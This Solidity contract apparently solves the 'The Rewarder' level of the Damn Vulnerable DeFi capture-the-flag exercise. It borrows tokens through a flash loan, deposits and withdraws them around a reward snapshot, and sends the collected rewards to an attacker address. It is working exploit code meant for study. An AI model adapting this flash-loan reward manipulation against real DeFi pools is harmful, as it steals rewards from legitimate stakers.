// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "../DamnValuableToken.sol";
import {console} from "../Console.sol";

import {TheRewarderPool} from "../the-rewarder/TheRewarderPool.sol";
// import "./AccountingToken.sol";

/**
 * @title AttackRewarder
 * @author sidarth16
 */

interface IFlashLoanerPool{
    function flashLoan(uint256 amount) external;
}

contract AttackRewarder {

    using Address for address;

    TheRewarderPool public rewarderPool;
    IERC20 rewardToken ;
    IERC20 liquidityToken ;
    address flashLoanPool ;
    address rewarderPoolAdd;
    uint256 targetSnapshotTimeStamp;

     // Minimum duration of each round of rewards in seconds
    uint256 private constant REWARDS_ROUND_MIN_DURATION = 5 days;

    constructor (
        address _rewardPool, 
        address _flashLoanPool,
        address _liquidityTokenAddress
    ) {
        rewarderPool = TheRewarderPool(_rewardPool);
        flashLoanPool = _flashLoanPool;
        liquidityToken = IERC20(_liquidityTokenAddress);
        rewardToken = IERC20(rewarderPool.rewardToken());
        rewarderPoolAdd = _rewardPool;
    }

    function attack(uint256 amt, address attacker) external
    {   
        console.log("Attack called for : ",amt);
        liquidityToken.approve(rewarderPoolAdd, amt);
        targetSnapshotTimeStamp = rewarderPool.lastRecordedSnapshotTimestamp();

        IFlashLoanerPool(flashLoanPool).flashLoan(amt);
        
        uint256 rewards_balance = rewardToken.balanceOf(address(this));
        rewardToken.transfer(attacker , rewards_balance );
    }

    function receiveFlashLoan(uint256 amt) external {
        console.log("Received Flash loan : ",amt);
        require(rewarderPool.lastRecordedSnapshotTimestamp() == targetSnapshotTimeStamp ) ;
        console.log("Depositing : ",amt);
        rewarderPool.deposit(amt);
        console.log("");
        rewarderPool.withdraw(amt);   

        console.log("Balance(DVT) in contract after withdraw : ",liquidityToken.balanceOf(address(this)));  
        liquidityToken.transfer(flashLoanPool, amt);

    }

}
